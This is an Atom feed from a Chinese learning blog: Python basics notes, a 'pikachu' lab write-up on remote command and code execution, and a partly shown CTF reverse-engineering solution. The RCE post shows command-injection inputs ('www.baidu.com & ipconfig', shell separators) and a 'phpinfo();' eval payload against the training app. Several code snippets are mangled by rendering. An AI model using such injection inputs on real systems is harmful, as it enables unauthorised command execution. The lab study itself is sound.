<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sinky&#39;s Blog</title>
  
  
  <link href="https://sinky.top/atom.xml" rel="self"/>
  
  <link href="https://sinky.top/"/>
  <updated>2022-08-14T02:37:33.045Z</updated>
  <id>https://sinky.top/</id>
  
  <author>
    <name>Sinky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python学习2</title>
    <link href="https://sinky.top/2022/08/13/python%E5%AD%A6%E4%B9%A02/"/>
    <id>https://sinky.top/2022/08/13/python%E5%AD%A6%E4%B9%A02/</id>
    <published>2022-08-13T14:45:32.587Z</published>
    <updated>2022-08-14T02:37:33.045Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h1><p>1、<code>if…else…</code></p><p>eg:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs money">s=int(input('请输入取款金额：'))<br>if money &gt;=s:<br>    money=money-s<br>    print('取款成功，余额为：',money)<br></code></pre></td></tr></tbody></table></figure><p>eg: 从键盘输入一个数判断奇偶。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs num">if num%2==0:<br>    print(num,'是偶数')<br>else:<br>    print(num,'是奇数')<br></code></pre></td></tr></tbody></table></figure><p>2、多分支：<code>if…elif…else</code></p><p>eg: 录入成绩：90-100为A,80-89为B,70-79为C,60-69为D,50-59为E,输入小于0或大于100为错误输入。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs score">if 90&lt;=score&lt;=100:<br>    print("you are A")<br>elif 80&lt;=score&lt;90:<br>    print('you are B')<br>elif 70&lt;=score&lt;80:<br>    print("you are C")<br>elif 60&lt;=score&lt;70:<br>    print("you are D")<br>elif 0&lt;=score&lt;60:<br>    print('you are E')<br>else:<br>    print('Error!!')<br></code></pre></td></tr></tbody></table></figure><p>3、嵌套if</p><p>eg: 购物结算时，会员&gt;=200 打八折，&gt;=100打九折，&lt;100不打折；非会员 &gt;=200 打9.5折，&lt;200 不打折</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs answer">money=int(input("请输入您的金额："))<br>if answer=='y':<br>    if money&gt;=200:<br>        print("打八折，您花费了：",money*0.8)<br>    elif money&gt;=100:<br>        print("打九折，您花费了：",money*0.9)<br>    else:<br>        print("不打折，您花费了：",money)<br>elif answer=='n':<br>    if money&gt;=200:<br>        print("打九五折，您花费了：",money*0.95)<br>    else:<br>        print("不打折，您花费了：",money)<br>else:<br>    print("您输入有误！")<br></code></pre></td></tr></tbody></table></figure><p>条件表达式： x if 判断条件 else y</p><p>eg: 比大小</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs a">b=int(input('input a num:'))<br>print( str(a)+'大于等于'+str(b)  if a&gt;b else str(a)+'小于等于'+str(b))<br></code></pre></td></tr></tbody></table></figure><p>pass: 占位符，什么也不做。</p><h1 id="内置函数-range"><a href="#内置函数-range" class="headerlink" title="内置函数 range()"></a>内置函数 range()</h1><ul><li>range(stop) —— 创建（0,stop）之间的整数序列，步长为1</li><li>range(start,stop) —— （start,stop）之间，步长为1</li><li>range(start,stop,step) —— （start,stop）,步长为step</li></ul><p>eg:</p><figure class="highlight r"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs r">print<span class="hljs-punctuation">(</span>r<span class="hljs-punctuation">)</span><br>r<span class="hljs-operator">=</span><span class="hljs-built_in">range</span><span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">10</span><span class="hljs-punctuation">)</span><br>print<span class="hljs-punctuation">(</span><span class="hljs-built_in">list</span><span class="hljs-punctuation">(</span>r<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span> <span class="hljs-comment">#[1, 2, 3, 4, 5, 6, 7, 8, 9]</span><br>print<span class="hljs-punctuation">(</span><span class="hljs-number">10</span> <span class="hljs-keyword">in</span> r<span class="hljs-punctuation">)</span> <span class="hljs-comment"># False</span><br>print<span class="hljs-punctuation">(</span><span class="hljs-number">9</span> <span class="hljs-keyword">in</span> r<span class="hljs-punctuation">)</span> <span class="hljs-comment"># True</span><br>print<span class="hljs-punctuation">(</span><span class="hljs-number">10</span> not <span class="hljs-keyword">in</span> r<span class="hljs-punctuation">)</span> <span class="hljs-comment">#True</span><br>print<span class="hljs-punctuation">(</span><span class="hljs-number">9</span> not <span class="hljs-keyword">in</span> r<span class="hljs-punctuation">)</span> <span class="hljs-comment">#False</span><br></code></pre></td></tr></tbody></table></figure><h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><p>1、<code>while 条件表达式： 循环体</code></p><p>eg: 计算0到4的累加和</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs a">sum=0<br>while a&lt;5:<br>    sum+=a<br>    a+=1<br>print('和为：',sum)<br> # 10<br></code></pre></td></tr></tbody></table></figure><p>eg:计算1-100之间偶数和</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs a">sum=0<br>while a&lt;101:<br>    if a%2==0:<br>        sum+=a<br>    a+=1<br>print(sum)<br> #  2550<br></code></pre></td></tr></tbody></table></figure><p>2、<code>for-in循环</code></p><p>依次取值，又称遍历</p><p><code>for 变量 in 可迭代对象：  循环体</code></p><p>在循环体中不需要变量时，可写作‘_’</p><figure class="highlight plaintext"><figcaption><span>i in 'python':</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs for">    print(i)<br>for a in range(10):<br>    print(a)<br>for _ in range(5):<br>    print('人生苦短，我用python')<br></code></pre></td></tr></tbody></table></figure><p>eg:计算1-100之间偶数和</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sum">for i in range(1,101):<br>    if i%2==0:<br>        sum+=i<br>print(sum)<br></code></pre></td></tr></tbody></table></figure><p>eg: 计算千以内的水仙花数</p><figure class="highlight plaintext"><figcaption><span>n in range(100,1000):</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs for">c=n%10<br>b=n//10%10<br>a=n//100<br>if n==a**3+b**3+c**3:<br>    print(n)<br></code></pre></td></tr></tbody></table></figure><p>3、流程控制语句break</p><p>用于结束循环结构</p><p>eg:录入密码，最多输入三次，正确则结束退出。</p><figure class="highlight plaintext"><figcaption><span>i in range(3):</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs for">pwd=input('请输入密码：')<br>if pwd=='8':<br>    print('正确')<br>    break<br>else:<br>    print('错误')<br></code></pre></td></tr></tbody></table></figure><p>4、continue 结束当前循环，进入下一循环。</p><p>eg: 1-50之间5的倍数：</p><figure class="highlight plaintext"><figcaption><span>i in range(1,51):</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs for">if i%5!=0:<br>    continue<br>print(i)<br></code></pre></td></tr></tbody></table></figure><p>5、else 语句</p><p>eg:</p><figure class="highlight plaintext"><figcaption><span>i in range(3):</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs for">    pwd=input("请输入密码：")<br>    if pwd=='8':<br>        print('True')<br>        break<br>    else:<br>        print('False')<br>else:<br>    print('Sorry,the three times all False')<br></code></pre></td></tr></tbody></table></figure><p>6、嵌套循环</p><p>eg: 三行四列的矩形</p><figure class="highlight plaintext"><figcaption><span>i in range(3):</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs for">for j in range(1,5):<br>    print('*',end='\t')<br>print()   <br></code></pre></td></tr></tbody></table></figure><p>eg: 左侧三角型</p><figure class="highlight plaintext"><figcaption><span>i in range(1,10):</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs for">for j in range(1,i+1):<br>    print('*',end='')<br>print()<br></code></pre></td></tr></tbody></table></figure><p>eg: 打印乘法表</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,10):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,i+1):<br>        <span class="hljs-built_in">print</span>(i,<span class="hljs-string">'*'</span>,j,<span class="hljs-string">'='</span>,i*j,<span class="hljs-attribute">end</span>=<span class="hljs-string">'    '</span>)<br>    <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></tbody></table></figure><p>7、二重循环中break和continue</p><p>eg:</p><figure class="highlight plaintext"><figcaption><span>i in range(5):</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs for">for j in range(1,11):<br>    if j%2==0:<br>        break<br>    print(j)<br></code></pre></td></tr></tbody></table></figure><p>j=1时，break退回外层循环，此后只执行外层循环；改成continue后，内循环将跳回 <code>for j in range(1,11)</code> 上</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分支结构&quot;&gt;&lt;a href=&quot;#分支结构&quot; class=&quot;headerlink&quot; title=&quot;分支结构&quot;&gt;&lt;/a&gt;分支结构&lt;/h1&gt;&lt;p&gt;1、&lt;code&gt;if…else…&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;eg:&lt;/p&gt;
&lt;figure class=&quot;highligh</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>pikachu-RCE</title>
    <link href="https://sinky.top/2022/08/11/pikachu-RCE/"/>
    <id>https://sinky.top/2022/08/11/pikachu-RCE/</id>
    <published>2022-08-11T14:17:28.967Z</published>
    <updated>2022-08-11T14:33:04.867Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RCE (remote command/code execute),可以让攻击者直接向后台服务器远程注入操作系统命令或代码，从而控制后台系统。</p><h2 id="远程系统命令执行"><a href="#远程系统命令执行" class="headerlink" title="远程系统命令执行"></a>远程系统命令执行</h2><p>一般出现这种漏洞是因为应用系统从设计上需要给用户提供指定的远程命令操作接口。一般会给用户一个ping操作的web界面，用户从web界面输入目标ip,提交后会对该IP地址进行一次ping测试，并返回测试结果。没有安全控制的话会导致攻击者通过该接口提交恶意命令，后台执行会控制整个后台服务器。</p><h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><p>后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略</p><pre><code class="hljs">exec "ping"</code></pre><p><img src="https://s2.loli.net/2022/08/11/bzJDf953yhviwBW.png" alt="图片.png"></p><p>ping一下本地返回正常。</p><p>输入命令： <code>www.baidu.com &amp; ipconfig</code> 发现可以获取到用户的ip地址。</p><p>“&amp;”的作用是先执行 <code>www.baidu.com</code></p><p>或者： &amp;、&amp;&amp;、|、||、； 等拼接执行命令。</p><pre><code class="hljs">exec "eval"</code></pre><p><img src="https://s2.loli.net/2022/08/11/3mcQnH1T2xrGCIb.png" alt="图片.png"></p><p>不知道为啥输入什么都报错</p><p><img src="https://s2.loli.net/2022/08/11/2I6MyJS4YBCxTpW.png" alt="图片.png"></p><p>看了一下网页代码，啥也没有，查看了后台源代码：</p><p><img src="https://s2.loli.net/2022/08/11/2I6MyJS4YBCxTpW.png" alt="图片.png"><br><img src="https://s2.loli.net/2022/08/11/OKkmEnHDoWRN94B.png" alt="图片.png"></p><p>用户输入值直接被带入到<code>eval()</code>函数中进行执行，没有任何安全处理。</p><p>输入 <code>phpinfo(); </code>返回显示了php系统信息。</p><p>eval函数的作用是将字符串当作php代码执行，它允许执行任意 PHP 代码</p><p>它允许执行任意 PHP 代码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;RCE (remote command/code execute),可以让攻击者直接向后台服务器远程注入操作系统命令或代码，从而控制后台系统</summary>
      
    
    
    
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="pikachu" scheme="https://sinky.top/tags/pikachu/"/>
    
    <category term="RCE" scheme="https://sinky.top/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>Python学习1</title>
    <link href="https://sinky.top/2022/08/10/python%E5%AD%A6%E4%B9%A01/"/>
    <id>https://sinky.top/2022/08/10/python%E5%AD%A6%E4%B9%A01/</id>
    <published>2022-08-10T11:57:31.721Z</published>
    <updated>2022-08-14T01:33:30.439Z</updated>
    
    <content type="html"><![CDATA[<h2 id="输出函数print"><a href="#输出函数print" class="headerlink" title="输出函数print()"></a>输出函数print()</h2><p>1.可输出数字、字符串、表达式</p><figure class="highlight plaintext"><figcaption><span>#520</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs print(520)">print('HelloWorld') #HelloWorld<br>print(3+1) #4<br></code></pre></td></tr></tbody></table></figure><p>2.将数据输出文件中 <code>file=fp</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fp">print('Hello',file=fp)<br>fp.close()<br></code></pre></td></tr></tbody></table></figure><blockquote><p><code>a+</code> 若文件不存在则创建，存在则在文件内容后追加，读写。</p></blockquote><p>3.不进行换行输出</p><p><code>print('Hello','world','python') #Hello world python</code></p><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><ol><li></li></ol><p><code>\n</code> - 换行；<code>\r</code> - 回车；<code>\t</code> - 水平制表符；<code>\b</code> - 退格；</p><figure class="highlight plaintext"><figcaption><span>#world #world将hello覆盖</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs print('hello\rworld')">print('hello\bworld') #hellworld #\b退格，将o退没了<br></code></pre></td></tr></tbody></table></figure><p>2.原字符，在字符串前加r或R，可使字符串内转义字符失效。</p><pre><code class="hljs">print(r'hello\nworld') #hello\nworld</code></pre><p>注意：字符串最后一个字符不可为斜杠。</p><h2 id="进制，字符编码，标识符，保留字"><a href="#进制，字符编码，标识符，保留字" class="headerlink" title="进制，字符编码，标识符，保留字"></a>进制，字符编码，标识符，保留字</h2><p>1Byte(字节)=8bit(位)</p><p>1KB(千字节)=1024Byte</p><p>1MB(兆字节)=1024KB</p><p>1GB(吉字节)=1024MB</p><p>1TB(太字节)=1024GB</p><p>标识符：字母、数字、下划线（不可以数字开头，严格区分大小写）</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>内存中一个带标签的空间</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs name">print('标识',id(name))<br>print('类型',type(name))<br>print('值',name)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><figcaption><span>1694477549296</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 标识">类型 &lt;class 'str'&gt;<br>值 Lihua<br></code></pre></td></tr></tbody></table></figure><p>多次赋值后，变量名会指向新的使用。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="int-整型"><a href="#int-整型" class="headerlink" title="int 整型"></a>int 整型</h3><ul><li>十进制 默认的进制0-9</li><li>二进制 以0b开头0,1</li><li>八进制 以0o开头0-7</li><li>十六禁止 以0x开头0-9，A-F</li></ul><h3 id="float-浮点型"><a href="#float-浮点型" class="headerlink" title="float 浮点型"></a>float 浮点型</h3><p>存储具有不精确性，可导入模块Decimal</p><figure class="highlight plaintext"><figcaption><span>decimal import Decimal</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs from">print(Decimal('1.1')+Decimal('2.2')) #3.3<br></code></pre></td></tr></tbody></table></figure><h3 id="str-字符串类型；bool-布尔类型"><a href="#str-字符串类型；bool-布尔类型" class="headerlink" title="str 字符串类型；bool 布尔类型"></a>str 字符串类型；bool 布尔类型</h3><p>字符串可用单引号、双引号、三引号或””” “””定义。</p><p>单引号双引号定义的字符串需要在一行；三引号可多行；</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs str">我用python'''<br>print(str)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 人生苦短，">我用python<br></code></pre></td></tr></tbody></table></figure><h3 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h3><ul><li>str() 其他转字符串，也可以引号转</li><li>int() 其他转整形，文字和小数不能转，浮点数抹零取整</li><li>float() 其他转浮点，文字类不可转，整数转浮点末尾加.0</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs name">age=20<br>print('我叫'+name+'，今年'+str(age)+'岁')<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs a">b=98.9<br>c=False<br>print(type(a),type(b),type(c))<br>print(str(a),str(b),str(c),type(str(a)),type(str(b)),type(str(c)))<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><figcaption><span>'int'&gt; <class 'float'=""> <class 'bool'=""></class></class></span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs <class">10 98.9 False &lt;class 'str'&gt; &lt;class 'str'&gt; &lt;class 'str'&gt;<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs s1">f1=98.7<br>s2='76.77'<br>ff=True<br>s3='hello'<br>print(int(s1),type(int(s1))) #128<br>print(int(f1),type(int(f1))) #98<br> #print(int(s2),type(int(s2))) #Error<br>print(int(ff),type(int(ff))) #1<br> #print(int(s3),type(int(s3))) #Error<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><figcaption><span><class 'int'=""></class></span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 128">98 &lt;class 'int'&gt;<br>1 &lt;class 'int'&gt;<br></code></pre></td></tr></tbody></table></figure><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>单行：#</p><p>多行：三引号</p><p>中文编码声明： <code>#coding:utf-8</code></p><h2 id="输入函数input"><a href="#输入函数input" class="headerlink" title="输入函数input()"></a>输入函数input()</h2><p>接收用户输入，返回类型str，存储’=’</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>1.算术运算符</p><p>加+  减-  乘*  除/  整除//  取余%  幂**</p><p>整除（一正一负向下取整）</p><p>取余（余数=被除数-除数*商）</p><p>2、赋值运算符 ‘=’</p><p>执行：从右至左；</p><p>+=、-=、*=、/=、//=、%=</p><pre><code class="hljs">a,b,c=10,20,30</code></pre><p><code>a+=30 # a=a+30</code></p><p>3.比较运算符 结果为bool</p><ul><li><blockquote><p>、&lt;、==、!=(不等于)、is、is not</p></blockquote></li><li>布尔：and,or,not,in,not in</li></ul><p>5.位运算符</p><p>与&amp; 11为1，否则为0</p><p>或| 00为0，否则为1</p><p>左移位&lt;&lt; 高位溢出舍弃，低位补0 （相当于乘2）</p><p>右移位&gt;&gt; 低位溢出舍弃，高位补0  （相当于除以2）</p><figure class="highlight plaintext"><figcaption><span># 0</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs print(4&amp;8)">print(4|8) # 12<br>print(4&lt;&lt;1) #8<br>print(4&gt;&gt;1) #2<br>print(4&lt;&lt;2) #16<br>print(4&gt;&gt;2) #1<br></code></pre></td></tr></tbody></table></figure><p>6.优先级</p><p>算术&gt;位&gt;比较&gt;布尔&gt;赋值</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;输出函数print&quot;&gt;&lt;a href=&quot;#输出函数print&quot; class=&quot;headerlink&quot; title=&quot;输出函数print()&quot;&gt;&lt;/a&gt;输出函数print()&lt;/h2&gt;&lt;p&gt;1.可输出数字、字符串、表达式&lt;/p&gt;
&lt;figure class=&quot;hig</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>SimpleRev</title>
    <link href="https://sinky.top/2022/08/10/SimpleRev-buu-Re/"/>
    <id>https://sinky.top/2022/08/10/SimpleRev-buu-Re/</id>
    <published>2022-08-10T02:14:24.700Z</published>
    <updated>2022-08-10T02:15:05.412Z</updated>
    
    <content type="html"><![CDATA[<p>IDA打开查看字符串，直接点进<code>Congratulation</code>找到关键函数<code>Decry()</code></p><p>浅分析一下</p><figure class="highlight plaintext"><figcaption><span>Decry()</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs __int64">{<br>  char *v0; <br>  char v2; <br>  int v3; <br>  signed int v4; <br>  signed int i; <br>  signed int v6; <br>  char src[8]; <br>  __int64 v8; <br>  int v9; <br>  __int64 v10; <br>  __int64 v11; <br>  int v12; <br>  __int64 v13; <br>  v13 = *MK_FP(__FS__, 40LL);<br>  *(_QWORD *)src = 'SLCDN';<br>  v8 = 0LL;<br>  v9 = 0;<br>  v10 = 'wodah';<br>  v11 = 0LL;<br>  v12 = 0;<br>  LODWORD(v0) = join(key3, &amp;v10); <br>// 小端序存储，v10要倒过来看：text=killshadow<br>  text = v0;<br>  strcpy(key, key1);  <br>  strcat(key, src);  // key=ADSFKNDCLS<br>  v3 = 0;<br>  v4 = 0;<br>  getchar();<br>  v6 = strlen(key);<br>// for循环是为了大写变小写<br>  for ( i = 0; i &lt; v6; ++i )<br>  {<br>    if ( key[v4 % v6] &gt; 64 &amp;&amp; key[v4 % v6] &lt;= 90 )<br>      key[i] = key[v4 % v6] + 32;<br>    ++v4;<br>  }<br>  printf("Please input your flag:", src);<br>  while ( 1 )<br>  {<br>    v2 = getchar();<br>    if ( v2 == 10 )<br>      break;<br>    if ( v2 == 32 )<br>    {<br>      ++v3;<br>    }<br>    else<br>    {<br>      if ( v2 &lt;= 96 || v2 &gt; 122 )<br>      {<br>        if ( v2 &gt; 64 &amp;&amp; v2 &lt;= 90 )<br>          str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97;<br>      }<br>      else<br>      {<br>        str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97; //核心代码<br>      }<br>      if ( !(v4 % v6) )<br>        putchar(32);<br>      ++v3;<br>    }<br>  }<br>//经过加密后str2与text一致得到Congratulation，则加密前的str2就是flag<br>  if ( !strcmp(text, str2) )<br>    puts("Congratulation!\n");<br>  else<br>    puts("Try again!\n");<br>  return *MK_FP(__FS__, 40LL) ^ v13;<br>}<br></code></pre></td></tr></tbody></table></figure><p>有取余，没法逆推，用爆破：</p><figure class="highlight processing"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs processing">py脚本：<br><span class="hljs-built_in">key</span>=<span class="hljs-string">"ADSFKNDCLS"</span><br><span class="hljs-built_in">text</span>=<span class="hljs-string">"killshadow"</span><br>s=<span class="hljs-string">""</span><br>flag=<span class="hljs-string">""</span><br><span class="hljs-built_in">loop</span>=<span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><br>v2 = <span class="hljs-number">0</span><br>v3 = <span class="hljs-number">0</span><br>v5 = <span class="hljs-title function_">len</span>(<span class="hljs-built_in">key</span>)<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span>(<span class="hljs-number">0</span>,v5):<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_">ord</span>(<span class="hljs-built_in">key</span>[i]) &gt; <span class="hljs-number">64</span> and <span class="hljs-title function_">ord</span>(<span class="hljs-built_in">key</span>[i]) &lt;= <span class="hljs-number">90</span> ):<br>        s += <span class="hljs-title function_">chr</span>(<span class="hljs-title function_">ord</span>(<span class="hljs-built_in">key</span>[i]) + <span class="hljs-number">32</span>)<br>    <span 